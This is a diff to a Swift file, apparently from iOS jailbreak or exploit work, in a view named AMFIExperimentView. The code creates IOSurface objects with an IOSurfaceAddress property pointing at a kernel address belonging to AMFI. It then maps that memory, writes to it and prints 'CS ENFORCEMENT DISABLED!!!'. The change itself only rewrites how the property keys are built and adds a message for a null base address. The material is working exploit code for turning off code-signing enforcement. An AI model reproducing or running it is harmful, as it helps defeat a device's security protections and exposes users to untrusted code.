@@ -3165,14 +3165,14 @@ struct AMFIExperimentView: View {
         detail += "AMFI target: 0x\(String(format: "%llx", amfiAddr))\n\n"
         
         // Create IOSurface with IOSurfaceAddress directly from our app
-        // This is what darksword does in create_surface_with_address!
-        let props: [String: Any] = [
-            "IOSurfaceAddress": Int64(bitPattern: targetAddr),
-            "IOSurfaceAllocSize": 0x4000,
+        let props: [IOSurfacePropertyKey: Any] = [
+            .allocSize: 0x4000,
         ]
+        // Add IOSurfaceAddress via raw key
+        var mutableProps = props
+        mutableProps[IOSurfacePropertyKey(rawValue: "IOSurfaceAddress")] = Int64(bitPattern: targetAddr)
         
-        // Use IOSurface Swift framework
-        let surface = IOSurface(properties: props as [IOSurfacePropertyKey: Any])
+        let surface = IOSurface(properties: mutableProps)
         
         if let surface = surface {
             detail += "✅ IOSurface created from app!\n"
@@ -3195,11 +3195,9 @@ struct AMFIExperimentView: View {
                     detail += "Now mapping AMFI address...\n"
                     
                     // Try AMFI address
-                    let amfiProps: [String: Any] = [
-                        "IOSurfaceAddress": Int64(bitPattern: amfiAddr),
-                        "IOSurfaceAllocSize": 0x4000,
-                    ]
-                    let amfiSurface = IOSurface(properties: amfiProps as [IOSurfacePropertyKey: Any])
+                    var amfiProps: [IOSurfacePropertyKey: Any] = [.allocSize: 0x4000]
+                    amfiProps[IOSurfacePropertyKey(rawValue: "IOSurfaceAddress")] = Int64(bitPattern: amfiAddr)
+                    let amfiSurface = IOSurface(properties: amfiProps)
                     if let amfiSurf = amfiSurface {
                         amfiSurf.lock(options: [], seed: nil)
                         let amfiBase = amfiSurf.baseAddress
@@ -3213,6 +3211,8 @@ struct AMFIExperimentView: View {
                             let verify = amfiBase.load(as: UInt32.self)
                             detail += "After write 1: 0x\(String(format: "%x", verify))\n"
                             detail += "CS ENFORCEMENT DISABLED!!!\n"
+                        } else {
+                            detail += "AMFI base is NULL\n"
                         }
                         amfiSurf.unlock(options: [], seed: nil)
                     } else {
